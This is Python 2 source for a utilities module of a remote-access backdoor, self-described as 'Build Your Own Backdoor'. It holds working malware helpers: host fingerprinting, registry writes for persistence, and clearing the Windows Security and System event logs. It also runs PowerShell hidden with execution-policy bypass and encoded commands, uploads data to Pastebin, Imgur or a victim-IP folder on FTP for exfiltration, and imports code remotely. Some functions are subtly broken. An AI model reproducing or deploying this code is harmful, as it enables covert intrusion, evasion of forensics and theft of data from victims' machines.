#!/usr/bin/python
# -*- coding: utf-8 -*-
'Utilities (Build Your Own Backdoor)'

# standard library
import json
import zlib
import uuid
import Queue
import string
import base64
import ctypes
import pickle
import struct
import socket
import random
import urllib
import urllib2
import marshal
import zipfile
import logging
import tempfile
import itertools
import functools
import threading
import subprocess
import contextlib
import collections
import logging.handlers
try:
    from cStringIO import StringIO
except:
    from StringIO import StringIO

# main
logging.basicConfig(level=logging.DEBUG, handler=logging.StreamHandler())
__logger__   = logging.getLogger(__name__)
__lock__     = threading.Lock()
__verbose__  = True

def log(info):
    """ 
    Log output to the console (if verbose output is enabled)

    """
    if __verbose__:
        with __lock__:
            __logger__.debug(str(info))

def imports(packages, module=None):
    """ 
    Attempt to import each package into the module specified

    `Required`
    :param list packages:   list of packages to import

    `Optional`
    :param str module:      target module name 

    """
    for package in packages:
        try:
            exec "import {}".format(package) in globals()
        except ImportError:
            log(str().join(("missing package '{}' is required".format(package), " for module '{}'".format(module) if module else "")))

def is_compatible(platforms=['win32','linux2','darwin'], module=None):
    """ 
    Verify that a module is compatible with the host platform

    `Optional`
    :param list platforms:   list of compatible platforms
    :param str module:       name of the module

    """
    import sys
    if sys.platform in platforms:
        return True
    log("module {} is not yet compatible with {} platforms".format(module if module else '', sys.platform))
    return False

@contextlib.contextmanager
def remote_repo(modules, base_url='http://localhost:8000/'):
    """ 
    Context manager object to add a new Importer instance
    to `sys.meta_path`, enabling direct remote imports,
    then remove the instance from `sys.meta_path`

    """
    import sys
    remote_importer = importer.Importer(modules, base_url)
    sys.meta_path.append(remote_importer)
    yield
    for importer in sys.meta_path:
        if importer.base_url[:-1] == base_url:
            sys.meta_path.remove(importer)

def platform():
    """ 
    Return the system platform of host machine

    """
    import sys
    return sys.platform

def public_ip():
    """ 
    Return public IP address of host machine

    """
    import urllib2
    return urllib2.urlopen('http://api.ipify.org').read()

def local_ip():
    """ 
    Return local IP address of host machine

    """
    import socket
    return socket.gethostbyname(socket.gethostname())

def mac_address():
    """ 
    Return MAC address of host machine

    """
    import uuid
    return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()

def architecture():
    """ 
    Check if host machine has 32-bit or 64-bit processor architecture

    """
    import struct
    return int(struct.calcsize('P') * 8)

def device():
    """ 
    Return the name of the host machine

    """
    import socket
    return socket.getfqdn(socket.gethostname())

def username():
    """ 
    Return username of current logged in user

    """
    import os
    return os.getenv('USER', os.getenv('USERNAME', 'user'))

def administrator():
    """ 
    Return True if current user is administrator, otherwise False

    """
    import os, ctypes
    return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0)

def ipv4(address):
    """ 
    Check if valid IPv4 address

    `Required`
    :param str address:   string to check

    Returns True if input is valid IPv4 address, otherwise False

    """
    import socket
    try:
        if socket.inet_aton(str(address)):
           return True
    except:
        return False

def status(timestamp):
    """ 
    Check the status of a job/thread

    `Required`
    :param float timestamp:   Unix timestamp (seconds since the Epoch)

    """
    import time
    c = time.time() - float(timestamp)
    data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
          '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
          '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
          '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
    return ', '.join([i for i in data if i])

def post(url, headers={}, data={}, as_json=False):
    """ 
    Make a HTTP post request and return response

    `Required`
    :param str url:       URL of target web page

    `Optional`
    :param dict headers:  HTTP request headers
    :param dict data:     HTTP request post data
    :param bool json:     return JSON formatted output

    """
    output = ''
    try:
        import requests
        req = requests.post(url, headers=headers, data=data)
        output = req.content
        if as_json:
            import json
            try:
                output = req.json()
            except: pass
        return output
    except ImportError:
        import urllib, urllib2
        data = urllib.urlencode(data)
        req  = urllib2.Request(str(url), data=data)
        for key, value in headers.items():
            req.headers[key] = value
        output = urllib2.urlopen(req).read()
        if as_json:
            import json
            try:
                output = json.loads(output)
            except: pass
        return output

def alert(text, title):
    """ 
    Windows alert message box

    `Required`
    :param str text:    message in the alert box
    :param str title:   title of the alert box

    """
    import os, ctypes, threading
    if os.name == 'nt':
        t = threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
        t.daemon = True
        t.start()
        return t

def normalize(source):
    """ 
    Normalize data/text/stream

    `Required`
    :param source:   string OR readable-file

    """
    import os
    if os.path.isfile(source):
        return open(source, 'rb').read()
    elif hasattr(source, 'getvalue'):
        return source.getvalue()
    elif hasattr(source, 'read'):
        if hasattr(source, 'seek'):
            source.seek(0)
        return source.read()
    else:
        return bytes(source)

def registry_key(key, subkey, value):
    """ 
    Create a new Windows Registry Key in HKEY_CURRENT_USER

    `Required`
    :param str key:         primary registry key name
    :param str subkey:      registry key sub-key name
    :param str value:       registry key sub-key value

    Returns True if successful, otherwise False

    """
    import os
    if os.name is 'nt':
        import _winreg
        reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, key, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(reg_key, subkey, 0, _winreg.REG_SZ, value)
        _winreg.CloseKey(reg_key)
        return True
    return False

def png(image):
    """ 
    Transforms raw image data into a valid PNG data

    `Required`
    :param image:   `numpy.darray` object OR `PIL.Image` object

    Returns raw image data in PNG format

    """
    import struct, numpy
    try:
        from cStringIO import StringIO
    except:
        from StringIO import StringIO
    if isinstance(image, numpy.ndarray):
        width, height = (image.shape[1], image.shape[0])
        data = image.tobytes()
    elif hasattr(image, 'width') and hasattr(image, 'height') and hasattr(image, 'rgb'):
        width, height = (image.width, image.height)
        data = image.rgb
    else:
        raise TypeError("invalid input type: {}".format(type(image)))
    line = width * 3
    png_filter = struct.pack('>B', 0)
    scanlines = b"".join([png_filter + data[y * line:y * line + line] for y in range(height)])
    magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
    ihdr = [b"", b'IHDR', b"", b""]
    ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
    ihdr[3] = struct.pack('>I', zlib.crc32(b"".join(ihdr[1:3])) & 0xffffffff)
    ihdr[0] = struct.pack('>I', len(ihdr[2]))
    idat = [b"", b'IDAT', zlib.compress(scanlines), b""]
    idat[3] = struct.pack('>I', zlib.crc32(b"".join(idat[1:3])) & 0xffffffff)
    idat[0] = struct.pack('>I', len(idat[2]))
    iend = [b"", b'IEND', b"", b""]
    iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
    iend[0] = struct.pack('>I', len(iend[2]))
    fileh = StringIO()
    fileh.write(magic)
    fileh.write(b"".join(ihdr))
    fileh.write(b"".join(idat))
    fileh.write(b"".join(iend))
    fileh.seek(0)
    return fileh

def delete(filename):
    """ 
    Tries to delete file via multiple methods, if necessary

    `Required`
    :param str target:     target filename to delete

    """
    import os
    if os.path.isfile(filename):
        target = filename
        try:
            os.chmod(target, 777)
        except: pass
        if os.name is 'nt':
            try:
                _ = os.popen('attrib -h -s -r %s' % target).read()
            except: pass
        try:
            os.remove(target)
        except: pass
        try:
            _ = os.popen(bytes('del /f /q %s' % target if os.name is 'nt' else 'rm -f %s' % target)).read()
        except: pass
    elif os.path.isdir(target):
        try:
            _ = os.popen(bytes('rmdir /s /q %s' % target if os.name is 'nt' else 'rm -f %s' % target)).read()
        except: pass
    else:
        pass

def clear_system_logs():
    """ 
    Clear Windows system logs (Application, security, Setup, System)

    """
    import os
    if os.name == 'nt':
        for log in ["application","security","setup","system"]:
            output = powershell_exec('"& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}"' % log)
            if output:
                log(output)

def kwargs(data):
    """ 
    Takes a string as input and returns a dictionary of keyword arguments

    `Required`
    :param str data:    string to parse for keyword arguments

    Returns dictionary of keyword arguments as key-value pairs

    """
    return {i.partition('=')[0]: i.partition('=')[2] for i in str(data).split() if '=' in i}

def powershell(code):
    """ 
    Execute code in Powershell.exe and return any results

    `Required`
    :param str code:      script block of Powershell code

    Returns any output from Powershell executing the code

    """
    import os, base64
    if os.name is 'nt':
        try:
            powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' if os.path.exists(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe') else os.popen('where powershell').read().rstrip()
            return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
        except Exception as e:
            log("{} error: {}".format(powershell.func_name, str(e)))

def display(output, color=None, style=None, end='\n'):
    """ 
    Display output in the console

    `Required`
    :param str output:    text to display

    `Optional`
    :param str color:     red, green, cyan, magenta, blue, white
    :param str style:     normal, bright, dim
    :param str end:       newline character

    """
    _color = ''
    _style = ''
    if color:
        import colorama
        _color = colorama.Fore.RESET
        _style = colorama.Style.NORMAL
        colorama.init()
        if hasattr(colorama.Fore, color.upper()):
            _color = getattr(colorama.Fore, color.upper())
    if style:
        if hasattr(colorama.Style, style.upper()):
            _style = getattr(colorama.Style, style.upper())
    if end == '\n':
        end = ''
    elif end == '':
        end = ','
    else:
        end = str(end)[:1]
    with __lock__:
        exec("print(_color + _style + output)%s" % end)
        if color:
            print(colorama.Fore.RESET + colorama.Style.NORMAL),

def color():
    """ 
    Returns a random color for use in console display

    """
    try:
        import random, colorama
        return getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','MAGENTA']))
    except Exception as e:
        log("{} error: {}".format(color.func_name, str(e)))

def imgur(source, api_key=None):
    """ 
    Upload image file/data to Imgur 

    """
    import base64
    if api_key:
        post = post('https://api.imgur.com/3/upload', headers={'Authorization': 'Client-ID {}'.format(api_key)}, data={'image': base64.b64encode(normalize(data)), 'type': 'base64'}, as_json=True)
        return post['data']['link'].encode()
    else:
        return "No Imgur API key found"

def pastebin(source, api_dev_key, api_user_key=None):
    """ 
    Upload file/data to Pastebin

    `Required`
    :param str source:         data or readable file-like object
    :param str api_dev_key:    Pastebin api_dev_key

    `Optional`
    :param str api_user_key:   Pastebin api_user_key

    """
    import os
    if api_dev_key:
        info={'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_dev_key}
        if api_user_key:
            info.update({'api_user_key'  : api_user_key})
        paste = post('https://pastebin.com/api/api_post.php', data=info)
        return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
    else:
        return "No Pastebin API key found"

def ftp(source, host=None, user=None, password=None, filetype=None):
    """ 
    Upload file/data to FTP server

    `Required`
    :param str source:    data or readable file-like object
    :param str host:      FTP server hostname
    :param str user:      FTP account username
    :param str password:  FTP account password

    `Optional`
    :param str filetype:  target file type (default: .txt)

    """
    import os, time, ftplib
    try:
        from cStringIO import StringIO
    except ImportError:
        from StringIO import StringIO
    if host and user and password:
        path  = ''
        local = time.ctime().split()
        if os.path.isfile(str(source)):
            path   = source
            source = open(path, 'rb')
        elif hasattr(source, 'seek'):
            source.seek(0)
        else:
            source = StringIO(source)
        try:
            ftp = ftplib.FTP(host=host, user=user, password=password)
        except:
            return "Upload failed - remote FTP server authorization error"
        addr = public_ip()
        if 'tmp' not in ftp.nlst():
            ftp.mkd('/tmp')
        if addr not in ftp.nlst('/tmp'):
            ftp.mkd('/tmp/{}'.format(addr))
        if path:
            path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
        else:
            filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
            path = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
        stor = ftp.storbinary('STOR ' + path, source)
        return path

def config(*arg, **options):
    """ 
    Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)

    """
    import functools
    def _config(function):
        @functools.wraps(function)
        def wrapper(*args, **kwargs):
            return function(*args, **kwargs)
        for k,v in options.items():
            setattr(wrapper, k, v)
        return wrapper
    return _config

def threaded(function):
    """ 
    Decorator for making a function threaded

    `Required`
    :param function:    function/method to run in a thread

    """
    import time, threading, functools
    @functools.wraps(function)
    def _threaded(*args, **kwargs):
        t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
        t.daemon = True
        t.start()
        return t
    return _threaded

@threaded
def spinner(flag):
    """ 
    Asynchronous spinner loading animation

    `Required`
    :param flag:   threading.Event object

    """
    import sys, itertools, threading
    spinner = itertools.cycle(['-', '/', '|', '\\'])
    while True:
        flag.wait()
        with __lock__:
            sys.stdout.write(next(spinner))
            sys.stdout.flush()
        flag.wait(0.2)
        with __lock__:
            sys.stdout.write('\b')
            sys.stdout.flush()    
